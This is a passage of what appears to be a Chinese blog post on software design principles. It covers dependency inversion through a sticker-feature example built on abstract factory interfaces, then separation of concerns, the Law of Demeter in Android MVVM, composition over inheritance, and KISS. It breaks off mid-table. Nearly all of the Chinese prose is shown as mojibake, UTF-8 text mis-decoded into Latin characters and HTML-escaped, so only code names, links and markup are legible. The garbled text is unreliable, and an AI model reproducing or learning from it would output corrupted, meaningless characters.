&lt;p>è€ƒè™‘è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€æ¬¾è§†é¢‘ç¼–è¾‘å™¨ï¼Œå…¶ä¸­æœ‰ä¸€é¡¹è´´çº¸åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·é€‰æ‹©ä¸åŒç±»å‹çš„è´´çº¸ï¼Œæ¯”å¦‚æœ‰é™æ€è´´çº¸ã€åŠ¨æ€è´´çº¸ç­‰ã€‚&lt;/p>
&lt;p>å¤šç§è´´çº¸ç±»å‹æ„å‘³ç€æœ‰å¤šä¸ªè´´çº¸çš„å®ç°ç±»ï¼Œä¾‹å¦‚ï¼š&lt;/p>
&lt;dl>
&lt;dt>StaticSticker&lt;/dt>
&lt;dd>æ”¯æŒå•å¼ å›¾ç‰‡çš„é™æ€è´´çº¸&lt;/dd>
&lt;dt>AnimatedSticker&lt;/dt>
&lt;dd>æ”¯æŒå›¾ç‰‡åºåˆ—å¸§çš„åŠ¨æ€è´´çº¸&lt;/dd>
&lt;/dl>
&lt;p>è´´çº¸ç±»å‹ä¸åŒï¼Œä½¿ç”¨æ–¹å¼ä¹Ÿæœ‰æ‰€ä¸åŒã€‚ä¾‹å¦‚ï¼Œé™æ€è´´çº¸åªéœ€ä¸€å¼ å›¾ç‰‡ï¼Œä»¥åŠè´´çº¸çš„ç»˜åˆ¶åŒºåŸŸã€èµ·å§‹æ—¶é—´ã€ç»“æŸæ—¶é—´ï¼›è€ŒåŠ¨æ€è´´çº¸éœ€è¦ä¸€ä¸ªåºåˆ—å¸§ï¼Œè€Œä¸”è¯¥åºåˆ—å¸§çš„æ—¶é—´é—´éš”å¯èƒ½æ˜¯å›ºå®šçš„ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸å›ºå®šçš„ã€‚å¦‚æœåœ¨ç¼–è¾‘å™¨çš„ä¸»ç¨‹åºä¸­ç›´æ¥ä½¿ç”¨è¿™ä¸¤ä¸ªæœªç»æŠ½è±¡çš„è´´çº¸å®ç°ç±»ï¼Œç»“æœå¯èƒ½æ˜¯ç¾éš¾æ€§çš„ï¼š&lt;/p>
&lt;ul>
&lt;li>ç”±äºä¸»ç¨‹åºéœ€è¦å…³æ³¨å…·ä½“çš„è´´çº¸å®ç°ç±»ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨ä¸»ç¨‹åºä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„å¼•èµ·å˜åŒ–çš„åŸå› ï¼ˆå‚è€ƒ&lt;a href="https://mincodes.com/posts/design-patterns/#single-responsibility-principle-%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99">å•ä¸€èŒè´£åŸåˆ™&lt;/a>ï¼‰,åç»­éœ€è¦æ‰©å±•æ–°çš„è´´çº¸ï¼Œæˆ–è€…æŸä¸ªè´´çº¸å®ç°éœ€è¦è°ƒæ•´æ—¶ï¼Œéƒ½å¯èƒ½ä¼šå¼•èµ·ä¸»ç¨‹åºçš„ä¿®æ”¹ï¼›&lt;/li>
&lt;li>ç”±äºä¸åŒè´´çº¸çš„ä½¿ç”¨é€»è¾‘ï¼ˆæ¥å£ï¼‰å¯èƒ½ä¸åŒï¼Œä¸»ç¨‹åºä¸­å¯èƒ½ä¼šå……æ–¥ç€å„ç§ &lt;code>if else&lt;/code> æˆ–è€…
&lt;code>switch case&lt;/code> çš„åˆ†æ”¯è¯­å¥ï¼Œåœ¨æ‰©å±•æ–°è´´çº¸ï¼Œæˆ–è€…è°ƒæ•´è´´çº¸å·¥ä½œæµç¨‹çš„æ—¶å€™ï¼Œä¼šå¼•å‘
&lt;strong>Shotgun Surgery éœ°å¼¹å¼ä¿®æ”¹&lt;/strong> (å‚è€ƒã€Šé‡æ„ã€‹3.6 ç« )ã€‚&lt;/li>
&lt;/ul>
&lt;p>å¦‚ä½•è§£å†³è¯¥é—®é¢˜ï¼Ÿç­”æ¡ˆå°±æ˜¯ &lt;strong>ä¾èµ–å€’ç½®&lt;/strong> ã€‚æˆ‘ä»¬åº”è¯¥ä¾èµ– Sticker çš„æŠ½è±¡æ¥å£ï¼Œè€Œä¸èƒ½ç›´æ¥ä¾èµ–ä¸åŒè´´çº¸çš„å…·ä½“å®ç°ç±»ã€‚å…·ä½“å¦‚ä½•åšåˆ°å‘¢ï¼Ÿä¸‹é¢æä¾›ä¸€ä¸ªæ€è·¯ä¾›å‚è€ƒã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å¯¹è´´çº¸è¿›è¡ŒæŠ½è±¡è®¾è®¡ï¼Œå¾—åˆ°è´´çº¸æ¥å£ &lt;code>Sticker&lt;/code>
ä»”ç»†åˆ†æè´´çº¸çš„éœ€æ±‚ï¼Œæˆ‘ä»¬å‘ç°å¤§è‡´å¯ä»¥å®šä¹‰å‡ºå¦‚ä¸‹å‡ ä¸ªæ¥å£ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>getStartTime()&lt;/code> - è·å–èµ·å§‹æ—¶é—´&lt;/li>
&lt;li>&lt;code>getEndTime()&lt;/code> - è·å–ç»“æŸæ—¶é—´&lt;/li>
&lt;li>&lt;code>getRect()&lt;/code> - è·å–ç»˜åˆ¶åŒºåŸŸ&lt;/li>
&lt;li>&lt;code>getImageAtTime()&lt;/code> - è·å–ä»»æ„æ—¶åˆ»çš„å›¾ç‰‡&lt;/li>
&lt;/ul>
&lt;p>æœ‰äº†ä¸Šè¿°å‡ ä¸ªæ¥å£ï¼Œä¸»ç¨‹åºå°±èƒ½å¤Ÿå®ç°åŸºæœ¬çš„è´´çº¸ç»˜åˆ¶æµç¨‹äº†ã€‚å› æ­¤ï¼Œä¸»ç¨‹åºå°±å¯ä»¥è„±ç¦»å¯¹è´´çº¸å…·ä½“å®ç°çš„ä¾èµ–ï¼Œè½¬å˜æˆä¾èµ–æŠ½è±¡æ¥å£ Sticker äº†ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æœ‰äº† &lt;code>Sticker&lt;/code> ä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°å…¶å®è¿˜ä¸å¤ªå¤Ÿã€‚å› ä¸ºæˆ‘ä»¬ä»ç„¶éœ€è¦åœ¨ä¸»ç¨‹åºä¸­æ„é€ å‡ºå…·ä½“çš„æŸä¸ªè´´çº¸ï¼Œä¸åŒè´´çº¸çš„æ„é€ é€»è¾‘å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œè€Œä¸”åç»­å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå› æ­¤ï¼Œè¿™ä»ç„¶ä¼šå¯¼è‡´å¯¹å…·ä½“å®ç°çš„ä¾èµ–ã€‚å¦‚ä½•æ‘†è„±è¿™ç§ä¾èµ–ï¼Ÿæˆ‘ä»¬è¿›ä¸€æ­¥å°†å¯¹è±¡çš„æ„é€ è¿‡ç¨‹è¿›è¡ŒæŠ½è±¡ï¼ŒæŠ½è±¡å‡ºä¸€ä¸ª &lt;code>StickerFactory&lt;/code> æ¥å£ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;code>createSticker(): Sticker&lt;/code> åˆ›å»ºæŸç§ç±»å‹çš„è´´çº¸ï¼Œå¹¶è¿”å› &lt;code>Sticker&lt;/code> æ¥å£&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>æœ‰äº†ä¸Šè¿°ä¸¤ä¸ªæ¥å£ï¼Œä¸»ç¨‹åºç®—æ˜¯å½»åº•æ‘†è„±äº†å¯¹è´´çº¸å…·ä½“å®ç°ç±»çš„ä¾èµ–äº†ï¼Œä¸”åŒæ–¹éƒ½å¯ä»¥ç‹¬ç«‹å¯¹å®ç°è¿›è¡Œè°ƒæ•´ï¼Œè€Œä¸ä¼šäº’ç›¸äº§ç”Ÿå½±å“ã€‚&lt;/p>
&lt;p>ä¹Ÿè®¸ä½ å¯èƒ½ä¼šé—®ï¼Œé‚£ &lt;code>StickerFactory&lt;/code> å¯¹è±¡åˆå¦‚ä½•æ„é€ å‘¢ï¼Ÿè¿™ä¸ªå¯¹è±¡å…¶å®å¯ä»¥å§”æ‰˜ç»™è´´çº¸é€‰æ‹©ç¨‹åºæ¥æ„é€ ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç”¨æˆ·é€‰ä¸­æŸä¸€æ¬¾è´´çº¸æ—¶ï¼Œè¯¥è´´çº¸çš„ç±»å‹å…¶å®å·²ç»ç¡®å®šäº†ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ°å½“çš„æ„é€ å‡ºå…·ä½“æ‰€éœ€è¦çš„ &lt;code>StickerFactory&lt;/code> ï¼ˆ &lt;code>StaticStickerFactory&lt;/code> æˆ–è€…
&lt;code>AnimatedStickerFactory&lt;/code> å®ä¾‹ï¼‰ã€‚&lt;/p>
&lt;p>è¿™ä¸ªä¾‹å­è®²å®Œäº†ï¼Œçœ‹èµ·æ¥æ˜¯ä¸æ˜¯å¾ˆçœ¼ç†Ÿï¼Ÿæ²¡é”™ï¼Œè¿™å°±æ˜¯&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">æŠ½è±¡å·¥å‚æ¨¡å¼&lt;/a>çš„ä¸€ä¸ªåº”ç”¨ã€‚ä¸‹é¢é™„ä¸Šè¿™ä¸ªä¾‹å­çš„ç±»å›¾ï¼Œæ–¹ä¾¿ç†è§£ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/sticker-class-diagram.png">
&lt;/figure>
&lt;h3 id="separation-of-concerns-åˆ†ç¦»å…³æ³¨ç‚¹">Separation of Concerns åˆ†ç¦»å…³æ³¨ç‚¹&lt;/h3>
&lt;blockquote>
&lt;p>åˆ†ç¦»å…³æ³¨ç‚¹æ˜¯æŒ‡å°†è½¯ä»¶åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå½¼æ­¤ç‹¬ç«‹çš„å•å…ƒï¼Œæ¯ä¸ªå•å…ƒå¤„ç†ä¸€ä¸ªåˆ†ç¦»çš„å…³æ³¨ç‚¹ï¼Œä¸åŒå•å…ƒä¹‹é—´ä¿æŒéš”ç¦»ï¼Œä»…é€šè¿‡å®šä¹‰è‰¯å¥½çš„æ¥å£è¿›è¡Œé€šä¿¡ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Separation of Concerns&lt;/strong> , ç®€ç§° &lt;strong>SoC&lt;/strong> ã€‚ç›¸æ¯”&lt;a href="https://mincodes.com/posts/design-patterns/#single-responsibility-principle-%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99">å•ä¸€èŒè´£åŸåˆ™&lt;/a>æ¥è¯´ï¼Œæˆ‘è§‰å¾—åˆ†ç¦»å…³æ³¨ç‚¹çš„æ¦‚å¿µä¼šæ›´é€šç”¨åŒ–ä¸€äº›ï¼Œæ›´å¤šå¼ºè°ƒäº†å¦‚ä½•é™ä½å¼€å‘è€…çš„å¿ƒæ™ºè´Ÿæ‹…ã€‚ä¾‹å¦‚ï¼Œæˆ‘åœ¨å¼€å‘ A æ¨¡å—çš„æ—¶å€™ï¼Œå¯ä»¥ä¸ç”¨æ“å¿ƒå…¶ä»– B/C/D æ¨¡å—çš„ä»»ä½•ç»†èŠ‚ï¼Œå¯ä»¥ä¸“æ³¨æŠ•å…¥åˆ° A æ¨¡å—çš„å¼€å‘å·¥ä½œä¸Šï¼Œè¿™æ ·æ•ˆç‡æœ€é«˜ï¼Œè€Œä¸”ä¸å®¹æ˜“å‡ºé”™ã€‚&lt;/p>
&lt;p>å¦å¤–ï¼Œ &lt;strong>SoC&lt;/strong> é™¤äº†è¡¨è¾¾å•ä¸€èŒè´£çš„å†…æ¶µï¼Œè¿˜éšå«äº†å•ä¸ªæ¨¡å—åº”è¯¥è¶³å¤Ÿå†…èšï¼Œæ¨¡å—ä¹‹é—´åº”è¯¥å°½é‡è§£è€¦ï¼Œåªèƒ½é€šè¿‡å®šä¹‰æ˜ç¡®çš„æ¥å£æ¥é€šä¿¡ç­‰æ„æ€ï¼Œå¦åˆ™æ˜¯åšä¸åˆ°åˆ†ç¦»å…³æ³¨ç‚¹çš„ã€‚&lt;/p>
&lt;p>è¿™ä¸ªæ¦‚å¿µå¯ä»¥æ¶µç›–åˆ°å¤šä¸ªä¸åŒçš„å±‚é¢ï¼Œå¯ä»¥å°åˆ°ä¸€ä¸ªå‡½æ•°ã€ä¸€ä¸ªç±»çš„åˆ’åˆ†ï¼Œå¤§åˆ°ä¸€ä¸ªæ¨¡å—ã€ä¸€ä¸ªå­ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥æ˜¯è½¯ä»¶çš„åˆ†å±‚è®¾è®¡ã€‚ä¾‹å¦‚ TCP/IP åè®®æ¨¡å‹ï¼Œå°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ç¬¦åˆ SoC
åŸåˆ™çš„è®¾è®¡ã€‚&lt;/p>
&lt;h3 id="law-of-demeter-æœ€å°‘çŸ¥è¯†åŸåˆ™">Law of Demeter æœ€å°‘çŸ¥è¯†åŸåˆ™&lt;/h3>
&lt;blockquote>
&lt;p>ä¹Ÿå«è¿ªç±³ç‰¹æ³•åˆ™ï¼Œæ˜¯æŒ‡ä¸€ä¸ªå®ä½“åº”å½“å°½é‡å°‘åœ°ä¸å…¶ä»–å®ä½“ä¹‹é—´å‘ç”Ÿç›¸äº’ä½œç”¨ï¼Œä½¿å¾—ç³»ç»ŸåŠŸèƒ½æ¨¡å—ä¹‹é—´ç›¸å¯¹ç‹¬ç«‹ã€‚è¿™æ ·ï¼Œå½“ä¿®æ”¹æŸä¸€ä¸ªæ¨¡å—æ—¶ï¼Œå°±ä¼šå°½é‡å°‘çš„å½±å“åˆ°å…¶ä»–æ¨¡å—ï¼Œæ‰©å±•ä¹Ÿä¼šç›¸å¯¹æ›´åŠ å®¹æ˜“ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>è¿™å…¶å®æ˜¯å¯¹è½¯ä»¶å®ä½“ä¹‹é—´çš„é€šä¿¡è¿›è¡Œçº¦æŸï¼Œå…¶æœ¬è´¨æ˜¯è¦æ±‚æˆ‘ä»¬åœ¨è¿›è¡Œè½¯ä»¶è®¾è®¡æ—¶ï¼Œè¦åšåˆ°å®ä½“å†…éƒ¨çš„â€‹&lt;strong>é«˜å†…èš&lt;/strong>, ä»¥åŠå®ä½“ä¹‹é—´çš„â€‹&lt;strong>ä½è€¦åˆ&lt;/strong>â€‹ã€‚&lt;/p>
&lt;p>ä¾‹å¦‚åœ¨ Android å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ˜¯é‡‡ç”¨ &lt;em>MvvM&lt;/em> æ¶æ„ï¼Œæ¯”è¾ƒå¥½çš„å®è·µæ˜¯å°½å¯èƒ½çš„æŠŠä½ çš„
&lt;em>Model&lt;/em> å±‚é€»è¾‘ï¼Œç”šè‡³æ˜¯ &lt;em>ViewModel&lt;/em> å±‚é€»è¾‘åšåˆ°å¹³å°æ— å…³ï¼Œå³ &lt;strong>ä¿æŒå¯¹å¹³å°çš„æœ€å°‘çŸ¥è¯†ï¼ˆä¾èµ–)&lt;/strong>,è¿™æ ·åšè‡³å°‘æœ‰å¦‚ä¸‹å¥½å¤„ï¼š&lt;/p>
&lt;ul>
&lt;li>å¯ä»¥ç¡®ä¿ä½ å°Šå¾ªäº† &lt;em>MvvM&lt;/em> æ¶æ„è§„èŒƒï¼Œ &lt;em>Model&lt;/em> &amp;amp; &lt;em>ViewModel&lt;/em> å±‚ä¸ä¼šå¯¹ &lt;em>View&lt;/em> å±‚æœ‰ç›´æ¥çš„ä¾èµ–ã€‚ &lt;em>ViewModel&lt;/em> å’Œ &lt;em>View&lt;/em> ä¹‹é—´ä»…ä¿æŒæ•°æ®å‘å¸ƒ/è®¢é˜…çš„å…³ç³»ï¼Œä¸å¯¹ &lt;em>View&lt;/em> äº§ç”Ÿç›´æ¥ä¾èµ–ã€‚åœ¨ Android å¹³å°ï¼Œ é¿å… &lt;em>ViewModel&lt;/em> å¯¹ &lt;em>View&lt;/em> å±‚çš„ä¾èµ–ååˆ†å¿…è¦ï¼Œè¿™å¯ä»¥é¿å…å¾ˆå¤šç”Ÿå‘½å‘¨æœŸæ–¹é¢çš„é—®é¢˜ï¼ˆå› ä¸º &lt;em>ViewModel&lt;/em> æ¯” &lt;em>View&lt;/em> å±‚çš„å¯¹è±¡å¾€å¾€å…·æœ‰æ›´é•¿çš„ç”Ÿå‘½å‘¨æœŸï¼‰ã€‚&lt;/li>
&lt;li>ä½ çš„ &lt;em>Model&lt;/em> &amp;amp; &lt;em>ViewModel&lt;/em> å’Œå¹³å°æ— å…³ï¼Œå…·å¤‡è¶³å¤Ÿçš„çµæ´»æ€§ã€‚ä¾‹å¦‚åœ¨ Android SDK å‘ç”Ÿå˜æ›´æˆ–è€…æ‰‹æœºå‚å•†è¡Œä¸ºä¸ä¸€è‡´æ—¶ï¼Œå¯ä»¥æ›´å®¹æ˜“çš„åœ¨ä¸Šå±‚åšé€‚é…ï¼Œè€Œæ— éœ€ä¿®æ”¹æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ã€‚&lt;/li>
&lt;li>æ•´ä¸ªç³»ç»Ÿçš„å¯æµ‹è¯•æ€§å°†å¤§å¹…æå‡ï¼Œ &lt;em>Model&lt;/em> &amp;amp; &lt;em>ViewModel&lt;/em> éƒ½å¯ä»¥è¿›è¡Œç‹¬ç«‹çš„å•å…ƒæµ‹è¯•ï¼Œè€Œä¸”è¿™ç§â€‹&lt;strong>å•å…ƒæµ‹è¯•æ˜¯å¯ä»¥è„±ç¦» Android è®¾å¤‡æˆ–è€… Android æ¨¡æ‹Ÿå™¨ç‹¬ç«‹è¿›è¡Œ&lt;/strong>â€‹çš„ï¼Œå³å¯ä»¥ç›´æ¥åœ¨ PC ä¸Šè·‘ï¼Œæµ‹è¯•ã€è°ƒè¯•æ•ˆç‡ä¹Ÿå¾—åˆ°äº†å¤§å¹…æå‡ã€‚&lt;/li>
&lt;/ul>
&lt;p>å…³äº &lt;em>ViewModel&lt;/em> çš„å•å…ƒæµ‹è¯•å¯ä»¥å‚è€ƒå®˜æ–¹çš„&lt;a href="https://developer.android.com/codelabs/basic-android-kotlin-compose-test-viewmodel?hl=zh-cn#0">è¿™ç¯‡ Codelab ç¤ºä¾‹&lt;/a>ã€‚&lt;/p>
&lt;h3 id="composite-reuse-principle-ç»„åˆå¤ç”¨åŸåˆ™">Composite Reuse Principle ç»„åˆå¤ç”¨åŸåˆ™&lt;/h3>
&lt;blockquote>
&lt;p>å¤šç”¨ç»„åˆ(HAS-A)ï¼Œå°‘ç”¨ç»§æ‰¿(IS-A)ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>é‡‡ç”¨ç»„åˆçš„æ–¹å¼æ¥å®ç°æ–°åŠŸèƒ½ï¼Œæœ‰å¦‚ä¸‹å¥½å¤„ï¼š&lt;/p>
&lt;dl>
&lt;dt>ç±»ä¹‹é—´çš„è€¦åˆæ›´ä½&lt;/dt>
&lt;dd>ç”±äºç»§æ‰¿å±äº &lt;strong>ç™½ç®±å¤ç”¨&lt;/strong> ,çˆ¶ç±»çš„å†…éƒ¨ç»†èŠ‚å¯¹å­ç±»åŸºæœ¬æ˜¯å¯è§çš„ï¼Œè¿™ç§å¤ç”¨æ–¹å¼åœ¨æŸç§ç¨‹åº¦ä¸Šç ´åäº†çˆ¶ç±»çš„å°è£…æ€§ï¼Œä¸€æ—¦çˆ¶ç±»çš„å®ç°å‘ç”Ÿå˜åŒ–ï¼Œå­ç±»å¾ˆæœ‰å¯èƒ½é¢ä¸´ä¿®æ”¹ã€‚è€Œç»„åˆå±äº &lt;strong>é»‘ç®±å¤ç”¨&lt;/strong> ,åœ¨å¤ç”¨æ—¶ä»…ä¾èµ–å…¶å¤–éƒ¨ç¨³å®šæ¥å£ï¼Œå†…éƒ¨å®ç°ç»†èŠ‚å¯¹å®¢æˆ·æ¥è¯´æ˜¯ä¸å¯è§çš„ã€‚å› æ­¤ï¼Œç»„åˆçš„æ–¹å¼æ˜æ˜¾å…·æœ‰æ›´ä½çš„è€¦åˆæ€§ã€‚&lt;/dd>
&lt;dt>æ›´åŠ ç®€å•ï¼Œä¸å®¹æ˜“å‡ºé”™&lt;/dt>
&lt;dd>ç»§æ‰¿éœ€è¦å¯¹çˆ¶ç±»çš„å·¥ä½œæœºåˆ¶æœ‰ä¸€å®šçš„äº†è§£ï¼Œä¸€æ—¦å¯¹ &lt;code>overwrite&lt;/code>
æ–¹æ³•ï¼ˆæˆ–å±æ€§ï¼‰çš„è®¾è®¡æ„å›¾äº§ç”Ÿé”™è¯¯ç†è§£ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´éš¾ä»¥é¢„æ–™çš„åæœï¼ˆå‚è€ƒ&lt;a href="https://mincodes.com/posts/design-patterns/#liskov-substitution-principle-%E9%87%8C%E6%B0%8F%E6%9B%BF%E6%8D%A2%E5%8E%9F%E5%88%99">é‡Œæ°æ›¿æ¢åŸåˆ™&lt;/a>ï¼‰ã€‚ç»„åˆåˆ™ç›¸å¯¹ç®€å•ä¸€äº›ï¼Œåªéœ€ç†è§£ &lt;code>public&lt;/code> æ¥å£å³å¯ã€‚&lt;/dd>
&lt;dt>ä¸ä¼šäº§ç”Ÿåºå¤§è€Œä¸å¯æ§çš„ç»§æ‰¿ä½“ç³»&lt;/dt>
&lt;dd>å¦‚æœæ»¥ç”¨ç»§æ‰¿ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´ä¸€ä¸ªåºå¤§çš„ç»§æ‰¿ä½“ç³»ï¼Œåˆ°æœ€åæ²¡æœ‰äººèƒ½çœŸæ­£ææ‡‚æ•´ä¸ªç³»ç»Ÿæ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œæ”¹ä»£ç å˜å¾—å¦‚å±¥è–„å†°ã€‚è€Œé‡‡ç”¨ç»„åˆåˆ™ä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜ã€‚&lt;/dd>
&lt;/dl>
&lt;p>å¦å¤–ï¼Œç»„åˆç›¸æ¯”ç»§æ‰¿éœ€è¦çš„çŸ¥è¯†æ›´å°‘ï¼Œè¿™ç‚¹å’Œ&lt;a href="https://mincodes.com/posts/design-patterns/#law-of-demeter-%E6%9C%80%E5%B0%91%E7%9F%A5%E8%AF%86%E5%8E%9F%E5%88%99">æœ€å°‘å°çŸ¥è¯†åŸåˆ™&lt;/a>ä¹Ÿæ˜¯ç›¸ç¬¦çš„ã€‚&lt;/p>
&lt;h3 id="å…¶ä»–åŸåˆ™">å…¶ä»–åŸåˆ™&lt;/h3>
&lt;p>è¿™é‡Œåˆ—ä¸€äº›å¯èƒ½å¹¶ä¸æ˜¯å¤§å®¶æ‰€å…¬è®¤çš„ï¼Œä½†æˆ‘ä¸ªäººè§‰å¾—åšè®¾è®¡æ—¶åº”è¯¥æ”¾åœ¨å¿ƒä¸Šçš„â€œåŸåˆ™â€ã€‚&lt;/p>
&lt;h4 id="ä¼˜å…ˆè€ƒè™‘å¯æµ‹è¯•æ€§">ä¼˜å…ˆè€ƒè™‘å¯æµ‹è¯•æ€§&lt;/h4>
&lt;p>åœ¨åšè®¾è®¡æ—¶ï¼Œä¼˜å…ˆè€ƒè™‘å¯æµ‹è¯•æ€§ã€‚è¿™æ ·åšæœ‰å¦‚ä¸‹å¥½å¤„ï¼š&lt;/p>
&lt;ul>
&lt;li>é™ä½ç¼–å†™å•å…ƒæµ‹è¯•çš„éš¾åº¦ã€‚å¦‚æœä¸€å¼€å§‹æ²¡æœ‰è€ƒè™‘åˆ°å¯æµ‹è¯•æ€§ï¼Œå¾€å¾€å¯èƒ½ä¼šå¯¼è‡´åç»­ç¼–å†™å•å…ƒæµ‹è¯•çš„æˆæœ¬è¾ƒé«˜ï¼Œç”šè‡³å¯èƒ½å‡ºç°ä¸ºäº†ç¼–å†™å•å…ƒæµ‹è¯•è€Œä¸å¾—ä¸é‡æ„ç°æœ‰è®¾è®¡çš„æƒ…å†µã€‚&lt;/li>
&lt;li>æœ‰åˆ©äºæé«˜è®¾è®¡çš„çµæ´»æ€§ï¼Œä¿ƒè¿›äº§ç”Ÿé«˜å†…èšã€ä½è€¦åˆçš„ç³»ç»Ÿã€‚å¦‚æœä¸€å¼€å§‹å°±è€ƒè™‘æ•´ä¸ªç³»ç»Ÿã€æ¨¡å—çš„å¯æµ‹è¯•æ€§ï¼Œå¾€å¾€å¯ä»¥å¯å‘æˆ‘ä»¬åšå‡ºæ›´çµæ´»çš„è®¾è®¡ï¼Œå¹¶ä¸”ä¿ƒä½¿æˆ‘ä»¬è®¾è®¡å‡ºæ›´å…·â€œé«˜å†…èšã€ä½è€¦åˆâ€ç‰¹ç‚¹çš„ç³»ç»Ÿã€‚&lt;/li>
&lt;/ul>
&lt;h4 id="kiss-åŸåˆ™">KISS åŸåˆ™&lt;/h4>
&lt;p>&lt;em>Keep It Simple and Stupid&lt;/em>.&lt;/p>
&lt;p>å°½å¯èƒ½è®©ä½ çš„è®¾è®¡ä¿æŒç®€æ´æ˜“æ‡‚ã€‚æˆ‘è§‰å¾—ä¸»è¦æœ‰å¦‚ä¸‹å‡ ä¸ªæ–¹é¢ï¼š&lt;/p>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>å°½é‡é¿å…å¼•å…¥æ–°æ¦‚å¿µ&lt;/p>
&lt;p>æ¯ä¸ªæ¦‚å¿µéƒ½æœ‰å­¦ä¹ æˆæœ¬ï¼Œåº”è¯¥å°½å¯èƒ½å¤ç”¨è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œæˆ–è€…è¡Œä¸šé¢†åŸŸå†…ç°æœ‰çš„æ¦‚å¿µä½“ç³»ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>é¿å…è¿‡åº¦è®¾è®¡&lt;/p>
&lt;p>è®¾è®¡æ˜¯ä¸ºäº†åº”å¯¹å˜åŒ–ï¼Œå¯¹äºä¸å¤ªå¯èƒ½å‘ç”Ÿå˜åŒ–ï¼ˆæˆ–è€…å˜åŒ–å¯æ§ï¼‰çš„éƒ¨åˆ†ï¼Œåº”è¯¥å°½é‡ä¿æŒç®€å•ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;!--list-separator-->
&lt;ul>
&lt;li>
&lt;p>ä¸€ä»¶äº‹æƒ…åªä¿ç•™ä¸€ç§æœ€ä½³åšæ³•&lt;/p>
&lt;p>å¯¹äºåŒä¸€ä»¶äº‹ä»¶ï¼Œä½ çš„è®¾è®¡æœ€å¥½åªä¿ç•™ä¸€ç§è¾¾æˆçš„é€”å¾„ï¼Œè€Œä¸”æ˜¯æœ€ä½³çš„é€”å¾„ã€‚&lt;/p>
&lt;p>å°½é‡è®©ç”¨æˆ·å°‘åšé€‰æ‹©ï¼Œé€‰æ‹©æ„å‘³ç€æˆæœ¬ï¼Œä¹Ÿæ„å‘³ç€å¯èƒ½çŠ¯é”™ã€‚&lt;/p>
&lt;p>è¿™ç‚¹æœ‰æ—¶å€™å¯èƒ½å’Œçµæ´»æ€§ä¼šæœ‰äº›å†²çªï¼Œéœ€è¦å¯¹å…·ä½“çš„éœ€æ±‚åšå‡ºæƒè¡¡è€ƒè™‘ã€‚ä½†è‡³å°‘å¯ä»¥åœ¨ä¿ç•™çµæ´»æ€§çš„åŒæ—¶ï¼Œæä¾›ä¸€äº›ç¼ºçœçš„è®¾ç½®æˆ–å·¥ä½œæ¨¡å¼ï¼Œæˆ–è€…åšä¸€äº›åˆ†å±‚è®¾è®¡ï¼Œè¿™æ ·å¯ä»¥è®©é‚£äº›ä¸éœ€è¦å®šåˆ¶åŒ–åŠŸèƒ½çš„ç”¨æˆ·åšæœ€å°‘çš„é€‰æ‹©ï¼Œå°±åƒ&lt;a href="https://mincodes.com/posts/design-patterns-structural/#é€‚ç”¨æ€§">Facade æ¨¡å¼&lt;/a>ä¸­æ‰€åšçš„é‚£æ ·ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="è®¾è®¡æ¨¡å¼">è®¾è®¡æ¨¡å¼&lt;/h2>
&lt;h3 id="æ¨¡å¼çš„åˆ†ç±»">æ¨¡å¼çš„åˆ†ç±»&lt;/h3>
&lt;p>æ ¹æ®æ¨¡å¼çš„ç›®çš„å’ŒèŒƒå›´ï¼Œå¯ä»¥å°†è®¾è®¡æ¨¡å¼å¤§è‡´åˆ’åˆ†ä¸ºå¦‚ä¸‹ç±»åˆ«ï¼š&lt;/p>
&lt;!-- This HTML table template is generated by emacs/table.el -->
&lt;table border="1">
&lt;tr>
&lt;td rowspan="2" align="left" valign="top">
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td rowspan="2" align="left" valign="top">
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br />
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
&lt;/td>
&lt;td colspan="3" align="left" valign="top">
